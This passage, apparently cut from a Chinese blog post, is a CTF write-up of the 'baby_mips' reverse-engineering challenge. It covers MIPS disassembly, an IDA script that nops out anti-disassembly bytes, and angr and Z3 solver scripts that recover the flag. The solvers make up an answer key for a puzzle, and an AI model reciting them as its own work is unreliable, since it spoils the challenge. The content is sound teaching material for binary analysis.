class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:00400420 loc_400420:                              # CODE XREF: sub_403238+424p</span><br><span class="line">.text:00400420                 addiu   $sp, -0x410</span><br><span class="line">.text:00400424                 sw      $fp, 0x40C($sp)</span><br><span class="line">.text:00400428                 move    $fp, $sp</span><br><span class="line">.text:0040042C                 sw      $a0, 0x410($fp)</span><br><span class="line">.text:00400430                 lwc1    $f29, 0x2EB($t1)</span><br><span class="line">.text:00400434                 li      $v0, 0x1EF9</span><br><span class="line">.text:00400438                 sw      $v0, 8($fp)</span><br><span class="line">.text:0040043C                 lw      $v0, 8($fp)</span><br><span class="line">.text:00400440                 sll     $v0, 1</span><br><span class="line">.text:00400444                 sw      $v0, 8($fp)</span><br><span class="line">.text:00400448                 lwu     $s6, 0x2EB($s6)</span><br><span class="line">.text:0040044C                 li      $v0, 0xBD5A</span><br><span class="line">.text:00400450                 sw      $v0, 0xC($fp)</span><br><span class="line">.text:00400454                 lw      $v0, 0xC($fp)</span><br><span class="line">.text:00400458                 xori    $v0, 8</span><br></pre></td></tr></table></figure><p>查找<code>lwc1</code>指令的含义，发现是与协处理器相关的指令。通过对后面的代码块进行分析发现，后面并没有用到<code>$f29</code>和<code>$t1</code>寄存器的内容，于是尝试利用Keypatch插件直接将0x400430处的指令<code>lwc1    $f29, 0x2EB($t1)</code>给<code>nop</code>掉。之后，再次运行程序并进行调试，程序运行到0x400448时又报错。同样采用<code>nop</code>指令的方式patch后，程序运行到0x400468时再次报错。通过分析发现，这些报错的指令的机器码均以<code>EB 02</code>开始，因此尝试编写脚本将所有类似的指令<code>nop</code>掉。</p><img data-src="images/baby_mips_4.png"><h4 id="程序“修复”"><a href="#程序“修复”" class="headerlink" title="程序“修复”"></a>程序“修复”</h4><p>由于MIPS指令是定长的，均为4个字节。因此，可以在选定的代码块中，将所有以<code>EB 02</code>开始的4字节数据全部替换成<code>00 00 00 00</code>，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x400420</span></span><br><span class="line">end_addr = <span class="number">0x403234</span></span><br><span class="line"><span class="keyword">while</span> start_addr &lt;= end_addr:</span><br><span class="line">    <span class="keyword">if</span> Byte(start_addr) == <span class="number">0xeb</span> <span class="keyword">and</span> Byte(start_addr +<span class="number">1</span>) == <span class="number">0x2</span>:</span><br><span class="line">        PatchByte(start_addr,<span class="number">0x00</span>)</span><br><span class="line">        PatchByte(start_addr+<span class="number">1</span>,<span class="number">0x00</span>)</span><br><span class="line">        PatchByte(start_addr+<span class="number">2</span>,<span class="number">0x00</span>)</span><br><span class="line">        PatchByte(start_addr+<span class="number">3</span>,<span class="number">0x00</span>)</span><br><span class="line">    start_addr += <span class="number">4</span></span><br></pre></td></tr></table></figure><blockquote><p>在MIPS指令中，<code>nop</code>对应的机器码为<code>00 00 00 00</code></p></blockquote><p>运行脚本后，选择”Edit”-&gt;”Patch program”-&gt;”Apply patch into input file…”，将更改保存到程序中。</p><p>之后，手动将从0x400420开始的代码块中夹杂的数据转换成代码，然后将0x400420处的代码转换成函数。之后就可以很清楚地看到函数0x400420内部的处理流程了。</p><h3 id="求解"><a href="#求解" class="headerlink" title="求解"></a>求解</h3><h4 id="angr求解"><a href="#angr求解" class="headerlink" title="angr求解"></a>angr求解</h4><p>通过对sub_0x400420函数内部的流程进行分析，其主要是对输入进行一系列运算，然后对运算结果进行校验，如果都满足则返回1，不满足则返回0。</p><p>虽然函数sub_0x400420内部的逻辑并不复杂，但是计算过程较多，比较繁琐，这时可以利用angr框架进行符号执行求解，而不用去理解具体的运算过程。angr是一个基于python的二进制漏洞分析框架，里面集成了多种主流的分析技术，能够进行动态的符号执行分析，也能够进行多种静态分析。近几年，其在CTF中的运用也很火。</p><p>通过静态分析可知，程序在0x40365c处调用sub_400420函数，其参数通过寄存器<code>a0</code>传递，然后返回值保存在<code>v0</code>寄存器中。之后对<code>v0</code>的内容进行判断，如果为1则输出flag(flag与用户输入的内容相关)，为0则输出”Wrong”。因此，只需要求解输入，保证sub_400420的返回值为1即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00403650                 lw      $gp, 0x98+var_50($fp)</span><br><span class="line">.text:00403654                 addiu   $v0, $fp, 0x98+var_48</span><br><span class="line">.text:00403658                 move    $a0, $v0</span><br><span class="line">.text:0040365C                 jal     sub_400420</span><br><span class="line">.text:00403660                 nop</span><br><span class="line">.text:00403664                 lw      $gp, 0x98+var_50($fp)</span><br><span class="line">.text:00403668                 beqz    $v0, loc_403714</span><br><span class="line">.text:0040366C                 nop</span><br></pre></td></tr></table></figure><p>使用angr进行求解的脚本如下。其中，<code>find_address</code>是使得函数sub_400420返回值为1的地址，而<code>avoid_address</code>是使得函数sub_400420返回值为0的地址。同时，将输入的16个数字保存在内存地址0x10000000处，然后将其赋值给<code>a0</code>寄存器，实现参数的传递。之后，直接从函数sub_400420的开始处开始分析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">project = angr.Project(<span class="string">&#x27;./baby_mips&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>:<span class="literal">False</span>&#125;)</span><br><span class="line"></span><br><span class="line">start_address = <span class="number">0x400420</span></span><br><span class="line">memory_address = <span class="number">0x10000000</span></span><br><span class="line"></span><br><span class="line">find_address = <span class="number">0x403220</span></span><br><span class="line">avoid_address = (<span class="number">0x401a08</span>, <span class="number">0x401ba0</span>,<span class="number">0x401d38</span>, <span class="number">0x401ed4</span>, <span class="number">0x402070</span>, <span class="number">0x40220c</span>, <span class="number">0x4023a4</span>, <span class="number">0x402540</span>, <span class="number">0x4026dc</span>, <span class="number">0x402878</span>, <span class="number">0x402a10</span>, <span class="number">0x402ba8</span>, <span class="number">0x402d44</span>, <span class="number">0x402edc</span>, <span class="number">0x403074</span>, <span class="number">0x403210</span>)</span><br><span class="line"></span><br><span class="line">state = project.factory.blank_state(addr=start_address, add_options=&#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">    state.memory.store(memory_address+i*<span class="number">4</span>, state.solver.BVS(<span class="string">&#x27;a%d&#x27;</span> % i, <span class="number">32</span>), endness=state.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">state.regs.a0 = memory_address</span><br><span class="line"></span><br><span class="line"><span class="comment"># add LAZY_SOLVES to speed up</span></span><br><span class="line">simgr = project.factory.simulation_manager(state)</span><br><span class="line"></span><br><span class="line">simgr.explore(find=find_address, avoid=avoid_address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    find_state = simgr.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add constraints to reduce the keyspace</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">        value = find_state.memory.load(memory_address+i*<span class="number">4</span>,<span class="number">4</span>, endness=find_state.arch.memory_endness)</span><br><span class="line">        find_state.add_constraints(value &gt; <span class="number">0</span>, value &lt; <span class="number">127</span>)</span><br><span class="line"></span><br><span class="line">    flag = [find_state.se.<span class="built_in">eval</span>(find_state.memory.load(memory_address+i*<span class="number">4</span>, <span class="number">4</span>, endness=find_state.arch.memory_endness)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>)]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,flag))</span><br></pre></td></tr></table></figure><h4 id="Z3求解"><a href="#Z3求解" class="headerlink" title="Z3求解"></a>Z3求解</h4><p>这里也给出使用Z3进行求解的过程。Z3是由微软开发的一个约束求解器，可以简单的理解它是解方程的神器。</p><p>函数sub_400420内部对参数的处理过程其实就是一个16元1次方程组，将输入看作是16个未知数，需要记录每个未知数前面的系数以及具体的运算过程。最直观的方式是单步跟踪程序的执行流程，一个一个地进行记录，但这个过程有点繁琐。通过分析，发现真正的计算是从0x40187c处开始，而且系数在内存空间是连续存放的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:0040187C                 lw      $v0, 0x410+var_408($fp)</span><br><span class="line">.text:00401880                 negu    $v1, $v0</span><br><span class="line">.text:00401884                 lw      $v0, 0x410+arg_0($fp)</span><br><span class="line">.text:00401888                 lw      $v0, 0($v0)</span><br><span class="line">.text:0040188C                 mul     $v1, $v0</span><br><span class="line">.text:00401890                 lw      $a0, 0x410+var_404($fp)</span><br><span class="line">.text:00401894                 lw      $v0, 0x410+arg_0($fp)</span><br><span class="line">.text:00401898                 addiu   $v0, 4</span><br><span class="line">.text:0040189C                 lw      $v0, 0($v0)</span><br><span class="line">.text:004018A0                 mul     $v0, $a0, $v0</span><br><span class="line">.text:004018A4                 subu    $v1, $v0</span><br><span class="line">.text:004018A8                 lw      $a0, 0x410+var_400($fp)</span><br><span class="line">.text:004018AC                 lw      $v0, 0x410+arg_0(</span><br></pre></td></tr></table></figure><p>因此可以直接在0x40187c处下断点，然后将<code>0x410+var_408($fp)</code>到<code>0x410+var_C($fp)</code>这段内存空间的内容在动态调试的过程中dump下来，如下：</p><img data-src="images/baby_mips_5.png"><p>然后再通过查看具体的运算操作指令即可</p><img data-src="images/baby_mips_6.png"><p>得到系数和具体的运算操作后，就可以使用Z3进行求解了，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = [BitVec(<span class="string">&#x27;a%d&#x27;</span> %i, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">0xffffc20e</span>*a[<span class="number">0</span>]-<span class="number">0xbd52</span>*a[<span class="number">1</span>]+<span class="number">0x7f57</span>*a[<span class="number">2</span>]+<span class="number">0x96cd</span>*a[<span class="number">3</span>]-<span class="number">0xac7f</span>*a[<span class="number">4</span>] +<span class="number">0x5d80</span>*a[<span class="number">5</span>]+<span class="number">0xb25e</span>*a[<span class="number">6</span>]+<span class="number">0x2447</span>*a[<span class="number">7</span>]+<span class="number">0xba8a</span>*a[<span class="number">8</span>]+<span class="number">0xbb41</span>*a[<span class="number">9</span>]+<span class="number">0xa3a8</span>*a[<span class="number">10</span>]+<span class="number">0xcb12</span>*a[<span class="number">11</span>]-<span class="number">0x6958</span>*a[<span class="number">12</span>]+<span class="number">0x5821</span>*a[<span class="number">13</span>]+<span class="number">0x77ed</span>*a[<span class="number">14</span>]+<span class="number">0xf7ff</span>*a[<span class="number">15</span>] == <span class="number">0x162f0ca</span> )</span><br><span class="line">s.add(<span class="number">0xeb44</span>*a[<span class="number">0</span>]-<span class="number">0x0f99</span>*a[<span class="number">1</span>] - <span class="number">0x40e7</span>*a[<span class="number">2</span>] +<span class="number">0xdf2e</span>*a[<span class="number">3</span>] -<span class="number">0x4b2e</span>*a[<span class="number">4</span>] -<span class="number">0x96b5</span>*a[<span class="number">5</span>] +<span class="number">0x9d66</span>*a[<span class="number">6</span>] -<span class="number">0xafa8</span>*a[<span class="number">7</span>] -<span class="number">0x6e26</span>*a[<span class="number">8</span>] -<span class="number">0xe655</span>*a[<span class="number">9</span>]- <span class="number">0x9a6e</span>*a[<span class="number">10</span>] +<span class="number">0x57ba</span>*a[<span class="number">11</span>] -<span class="number">0x227c</span>*a[<span class="number">12</span>] +<span class="number">0xbdd1</span>*a[<span class="number">13</span>] +<span class="number">0xb437</span>*a[<span class="number">14</span>] +<span class="number">0x5d3f</span>*a[<span class="number">15</span>]== <span class="number">0xffec2e48</span>)</span><br><span class="line">s.add(<span class="number">0xe6f1</span>*a[<span class="number">0</span>] +<span class="number">0xa4b2</span>*a[<span class="number">1</span>] -<span class="number">0xfe74</span>*a[<span class="number">2</span>] -<span class="number">0x0f07</span>*a[<span class="number">3</span>] -<span class="number">0x5d22</span>*a[<span class="number">4</span>] -<span class="number">0xb845</span>*a[<span class="number">5</span>] -<span class="number">0x9954</span>*a[<span class="number">6</span>] +<span class="number">0x93ac</span>*a[<span class="number">7</span>] -<span class="number">0x51e4</span>*a[<span class="number">8</span>] -<span class="number">0x4b11</span>*a[<span class="number">9</span>] +<span class="number">0xdc93</span>*a[<span class="number">10</span>] +<span class="number">0x13f8</span>*a[<span class="number">11</span>] +<span class="number">0x246c</span>*a[<span class="number">12</span>] +<span class="number">0xf121</span>*a[<span class="number">13</span>] +<span class="number">0xf09f</span>*a[<span class="number">14</span>] +<span class="number">0x0dfa</span>*a[<span class="number">15</span>] == <span class="number">0xd3c060</span>)</span><br><span class="line">s.add(<span class="number">0xffff7085</span>*a[<span class="number">0</span>] -<span class="number">0x6623</span>*a[<span class="number">1</span>] +<span class="number">0x0686</span>*a[<span class="number">2</span>] +<span class="number">0x4b2d</span>*a[<span class="number">3</span>] +<span class="number">0x68df</span>*a[<span class="number">4</span>] +<span class="number">0x9be7</span>*a[<span class="number">5</span>] +<span class="number">0x21b4</span>*a[<span class="number">6</span>] +<span class="number">0xe25a</span>*a[<span class="number">7</span>] -<span class="number">0xc807</span>*a[<span class="number">8</span>] +<span class="number">0xf695</span>*a[<span class="number">9</span>] -<span class="number">0x5421</span>*a[<span class="number">10</span>] -<span class="number">0x2469</span>*a[<span class="number">11</span>] +<span class="number">0x9f29</span>*a[<span class="number">12</span>] -<span class="number">0xe311</span>*a[<span class="number">13</span>] +<span class="number">0x78f2</span>*a[<span class="number">14</span>] -<span class="number">0x6bda</span>*a[<span class="number">15</span>] == <span class="number">0x8bf576</span>)</span><br><span class="line">s.add(<span class="number">0xffff07b8</span>*a[<span class="number">0</span>] -<span class="number">0xd048</span>*a[<span class="number">1</span>] -<span class="number">0x85f1</span>*a[<span class="number">2</span>] +<span class="number">0xee84</span>*a[<span class="number">3</span>] -<span class="number">0x37d1</span>*a[<span class="number">4</span>] +<span class="number">0xb74a</span>*a[<span class="number">5</span>] +<span class="number">0xcfe2</span>*a[<span class="number">6</span>]+ <span class="number">0x8f1e</span>*a[<span class="number">7</span>] -<span class="number">0xf211</span>*a[<span class="number">8</span>] -<span class="number">0x83bf</span>*a[<span class="number">9</span>] -<span class="number">0x1249</span>*a[<span class="number">10</span>] +<span class="number">0x7ea7</span>*a[<span class="number">11</span>] -<span class="number">0x4294</span>*a[<span class="number">12</span>] -<span class="number">0xb661</span>*a[<span class="number">13</span>] -<span class="number">0x8a73</span>*a[<span class="number">14</span>] -<span class="number">0x5e5c</span>*a[<span class="number">15</span>] == <span class="number">0xff4ea5b3</span>)</span><br><span class="line">s.add(<span class="number">0xffffd6b5</span>*a[<span class="number">0</span>] -<span class="number">0x2b5f</span>*a[<span class="number">1</span>]+ <span class="number">0xc981</span>*a[<span class="number">2</span>] -<span class="number">0x60c3</span>*a[<span class="number">3</span>] +<span class="number">0xf8f2</span>*a[<span class="number">4</span>]+ <span class="number">0xded7</span>*a[<span class="number">5</span>]- <span class="number">0xf6fb</span>*a[<span class="number">6</span>] +<span class="number">0x1083</span>*a[<span class="number">7</span>]- <span class="number">0xdc96</span>*a[<span class="number">8</span>]- <span class="number">0x587e</span>*a[<span class="number">9</span>] -<span class="number">0xb4f5</span>*a[<span class="number">10</span>] +<span class="number">0xf57a</span>*a[<span class="number">11</span>] +<span class="number">0x57d0</span>*a[<span class="number">12</span>] +<span class="number">0xe814</span>*a[<span class="number">13</span>] +<span class="number">0x6169</span>*a[<span class="number">14</span>] +<span class="number">0xf285</span>*a[<span class="number">15</span>] == <span class="number">0x9dd61e</span>)</span><br><span class="line">s.add(<span class="number">0xcd89</span>*a[<span class="number">0</span>] -<span class="number">0xd43d</span>*a[<span class="number">1</span>] +<span class="number">0xf037</span>*a[<span class="number">2</span>] +<span class="number">0x83a8</span>*a[<span class="number">3</span>] -<span class="number">0xa305</span>*a[<span class="number">4</span>] -<span class="number">0xadef</span>*a[<span class="number">5</span>] +<span class="number">0xcaaa</span>*a[<span class="number">6</span>] -<span class="number">0xf145</span>*a[<span class="number">7</span>]- <span class="number">0x6073</span>*a[<span class="number">8</span>]- <span class="number">0x2777</span>*a[<span class="number">9</span>] +<span class="number">0x794f</span>*a[<span class="number">10</span>] +<span class="number">0xf00e</span>*a[<span class="number">11</span>] -<span class="number">0xe7d5</span>*a[<span class="number">12</span>] +<span class="number">0x2654</span>*a[<span class="number">13</span>] -<span class="number">0xbed0</span>*a[<span class="number">14</span>] -<span class="number">0xb8af</span>*a[<span class="number">15</span>] == <span class="number">0xff6baab3</span>)</span><br><span class="line">s.add(<span class="number">0xffff6108</span>*a[<span class="number">0</span>] -<span class="number">0x6766</span>*a[<span class="number">1</span>] +<span class="number">0xd58e</span>*a[<span class="number">2</span>] -<span class="number">0x5ca3</span>*a[<span class="number">3</span>] +<span class="number">0x2718</span>*a[<span class="number">4</span>] +<span class="number">0x1e2b</span>*a[<span class="number">5</span>] -<span class="number">0xf49e</span>*a[<span class="number">6</span>] +<span class="number">0xcf78</span>*a[<span class="number">7</span>] +<span class="number">0x7c09</span>*a[<span class="number">8</span>] -<span class="number">0x13b7</span>*a[<span class="number">9</span>] -<span class="number">0xbeee</span>*a[<span class="number">10</span>]- <span class="number">0xe450</span>*a[<span class="number">11</span>] +<span class="number">0x4da3</span>*a[<span class="number">12</span>] -<span class="number">0x8880</span>*a[<span class="number">13</span>] -<span class="number">0x5691</span>*a[<span class="number">14</span>] +<span class="number">0x8bd8</span>*a[<span class="number">15</span>] == <span class="number">0xff818f06</span>)</span><br><span class="line">s.add(<span class="number">0xffffa564</span>*a[<span class="number">0</span>] -<span class="number">0xa95a</span>*a[<span class="number">1</span>] -<span class="number">0xe643</span>*a[<span class="number">2</span>] +<span class="number">0x0d38</span>*a[<span class="number">3</span>] -<span class="number">0x097a</span>*a[<span class="number">4</span>] -<span class="number">0xeb22</span>*a[<span class="number">5</span>] +<span class="number">0xcac3</span>*a[<span class="number">6</span>] -<span class="number">0x4ed1</span>*a[<span class="number">7</span>] -<span class="number">0x7c8a</span>*a[<span class="number">8</span>] +<span class="number">0xf107</span>*a[<span class="number">9</span>] +<span class="number">0xa59e</span>*a[<span class="number">10</span>]- <span class="number">0x1213</span>*a[<span class="number">11</span>] +<span class="number">0xb2b5</span>*a[<span class="number">12</span>] -<span class="number">0x7213</span>*a[<span class="number">13</span>] -<span class="number">0x2b83</span>*a[<span class="number">14</span>] -<span class="number">0xa155</span>*a[<span class="number">15</span>] == <span class="number">0xff8d50e7</span>)</span><br><span class="line">s.add(<span class="number">0xffff6c45</span>*a[<span class="number">0</span>] -<span class="number">0x2752</span>*a[<span class="number">1</span>] -<span class="number">0xbdc3</span>*a[<span class="number">2</span>] -<span class="number">0xf495</span>*a[<span class="number">3</span>] -<span class="number">0x7121</span>*a[<span class="number">4</span>] +<span class="number">0x9c41</span>*a[<span class="number">5</span>] -<span class="number">0x9465</span>*a[<span class="number">6</span>]- <span class="number">0x6ce3</span>*a[<span class="number">7</span>] -<span class="number">0x4f28</span>*a[<span class="number">8</span>] -<span class="number">0x8350</span>*a[<span class="number">9</span>] -<span class="number">0x176e</span>*a[<span class="number">10</span>] +<span class="number">0x7814</span>*a[<span class="number">11</span>] -<span class="number">0x739a</span>*a[<span class="number">12</span>] +<span class="number">0x5494</span>*a[<span class="number">13</span>] +<span class="number">0x142d</span>*a[<span class="number">14</span>] +<span class="number">0xca55</span>*a[<span class="number">15</span>] == <span class="number">0xff3f9826</span>)</span><br><span class="line">s.add(<span class="number">0xcf01</span>*a[<span class="number">0</span>] +<span class="number">0xf378</span>*a[<span class="number">1</span>] +<span class="number">0x1064</span>*a[<span class="number">2</span>] -<span class="number">0xd9a7</span>*a[<span class="number">3</span>] -<span class="number">0x077d</span>*a[<span class="number">4</span>]+ <span class="number">0x6dab</span>*a[<span class="number">5</span>] -<span class="number">0xaf1f</span>*a[<span class="number">6</span>]- <span class="number">0x3db7</span>*a[<span class="number">7</span>] +<span class="number">0x3554</span>*a[<span class="number">8</span>] -<span class="number">0xcb8e</span>*a[<span class="number">9</span>] -<span class="number">0x9815</span>*a[<span class="number">10</span>]+ <span class="number">0xf30b</span>*a[<span class="number">11</span>] +<span class="number">0x9c5e</span>*a[<span class="number">12</span>] -<span class="number">0x5d07</span>*a[<span class="number">13</span>] -<span class="number">0x4c31</span>*a[<span class="number">14</span>] +<span class="number">0xeae0</span>*a[<span class="number">15</span>] == <span class="number">0x213fed</span>)</span><br><span class="line">s.add(<span class="number">0x8bd4</span>*a[<span class="number">0</span>] -<span class="number">0x6d81</span>*a[<span class="number">1</span>] -<span class="number">0xe772</span>*a[<span class="number">2</span>] +<span class="number">0xb6f1</span>*a[<span class="number">3</span>] +<span class="number">0x9b57</span>*a[<span class="number">4</span>] -<span class="number">0x597d</span>*a[<span class="number">5</span>] +<span class="number">0x15d1</span>*a[<span class="number">6</span>]- <span class="number">0xa55e</span>*a[<span class="number">7</span>]+ <span class="number">0xfd13</span>*a[<span class="number">8</span>]+ <span class="number">0x17b4</span>*a[<span class="number">9</span>] +<span class="number">0xec78</span>*a[<span class="number">10</span>] -<span class="number">0xd51a</span>*a[<span class="number">11</span>] +<span class="number">0x56ad</span>*a[<span class="number">12</span>] -<span class="number">0xc319</span>*a[<span class="number">13</span>] +<span class="number">0x9f8e</span>*a[<span class="number">14</span>] +<span class="number">0xfa17</span>*a[<span class="number">15</span>] == <span class="number">0xa9f0dc</span>)</span><br><span class="line">s.add(<span class="number">0xffffb798</span>*a[<span class="number">0</span>] -<span class="number">0x8bef</span>*a[<span class="number">1</span>] +<span class="number">0x109d</span>*a[<span class="number">2</span>]- <span class="number">0xf9d4</span>*a[<span class="number">3</span>] +<span class="number">0x4ecf</span>*a[<span class="number">4</span>] +<span class="number">0xa896</span>*a[<span class="number">5</span>] +<span class="number">0x773b</span>*a[<span class="number">6</span>] +<span class="number">0x6e8a</span>*a[<span class="number">7</span>] -<span class="number">0x737c</span>*a[<span class="number">8</span>]+ <span class="number">0x4979</span>*a[<span class="number">9</span>] +<span class="number">0xc685</span>*a[<span class="number">10</span>] -<span class="number">0x96ae</span>*a[<span class="number">11</span>] +<span class="number">0x0bbd</span>*a[<span class="number">12</span>] +<span class="number">0x8280</span>*a[<span class="number">13</span>] +<span class="number">0xe3a9</span>*a[<span class="number">14</span>] -<span class="number">0x730c</span>*a[<span class="number">15</span>] == <span class="number">0xbdeb20</span>)</span><br><span class="line">s.add(<span class="number">0x0b20</span>*a[<span class="number">0</span>] +<span class="number">0x9b9c</span>*a[<span class="number">1</span>] +<span class="number">0xb4aa</span>*a[<span class="number">2</span>]+ <span class="number">0x6176</span>*a[<span class="number">3</span>] +<span class="number">0x9670</span>*a[<span class="number">4</span>] +<span class="number">0x7c9d</span>*a[<span class="number">5</span>] -<span class="number">0x5402</span>*a[<span class="number">6</span>] -<span class="number">0x8cd2</span>*a[<span class="number">7</span>] +<span class="number">0xac82</span>*a[<span class="number">8</span>] +<span class="number">0xa2f5</span>*a[<span class="number">9</span>] -<span class="number">0x8efd</span>*a[<span class="number">10</span>] -<span class="number">0x65f1</span>*a[<span class="number">11</span>] -<span class="number">0x94b9</span>*a[<span class="number">12</span>] +<span class="number">0x8cb8</span>*a[<span class="number">13</span>] +<span class="number">0x1cb5</span>*a[<span class="number">14</span>] +<span class="number">0x4aa1</span>*a[<span class="number">15</span>] == <span class="number">0x9c7cf5</span>)</span><br><span class="line">s.add(<span class="number">0x57fd</span>*a[<span class="number">0</span>] +<span class="number">0x3d83</span>*a[<span class="number">1</span>] +<span class="number">0xf745</span>*a[<span class="number">2</span>] +<span class="number">0xa5c4</span>*a[<span class="number">3</span>] -<span class="number">0x65fa</span>*a[<span class="number">4</span>] -<span class="number">0x58e9</span>*a[<span class="number">5</span>] +<span class="number">0xbebe</span>*a[<span class="number">6</span>] +<span class="number">0x1820</span>*a[<span class="number">7</span>] -<span class="number">0xd7b9</span>*a[<span class="number">8</span>] -<span class="number">0xb21f</span>*a[<span class="number">9</span>] -<span class="number">0x76a0</span>*a[<span class="number">10</span>] +<span class="number">0xc60d</span>*a[<span class="number">11</span>] +<span class="number">0x168f</span>*a[<span class="number">12</span>] +<span class="number">0x2a96</span>*a[<span class="number">13</span>] +<span class="number">0x31d6</span>*a[<span class="number">14</span>] -<span class="number">0x4b88</span>*a[<span class="number">15</span>] == <span class="number">0xd08e2</span>)</span><br><span class="line">s.add(<span class="number">0xffff1bae</span>*a[<span class="number">0</span>] -<span class="number">0xc7d4</span>*a[<span class="number">1</span>] -<span class="number">0x1554</span>*a[<span class="number">2</span>] +<span class="number">0x7eea</span>*a[<span class="number">3</span>] -<span class="number">0x684d</span>*a[<span class="number">4</span>] +<span class="number">0x6adb</span>*a[<span class="number">5</span>] +<span class="number">0x8534</span>*a[<span class="number">6</span>] -<span class="number">0x3a36</span>*a[<span class="number">7</span>] +<span class="number">0x29f0</span>*a[<span class="number">8</span>] +<span class="number">0xd3f2</span>*a[<span class="number">9</span>] -<span class="number">0x23e5</span>*a[<span class="number">10</span>] -<span class="number">0x6540</span>*a[<span class="number">11</span>] +<span class="number">0xbcd3</span>*a[<span class="number">12</span>] -<span class="number">0xef9b</span>*a[<span class="number">13</span>] +<span class="number">0xefdb</span>*a[<span class="number">14</span>] -<span class="number">0x774e</span>*a[<span class="number">15</span>] == <span class="number">0x178803</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> a:</span><br><span class="line">    s.add(item &gt; <span class="number">0</span>, item &lt; <span class="number">127</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">        flag.append(m[a[i]].as_long())</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, flag))</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>IDA Pro暂时不支持将MISP汇编代码转换成类C代码，即所谓的F5功能。目前，可以反编译MIPS汇编代码的工具主要有两个：</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9yZXRkZWMuY29tL2hvbWUv">Retargetable Decompiler<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cucG5mc29mdHdhcmUuY29tL2plYjIvbWlwcw==">JEB Decompiler for MIPS<i class="fa fa-external-link-alt"></i></span></li></ul><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cucWVtdS5vcmcv">QEMU, the FAST! processor emulator<i class="fa 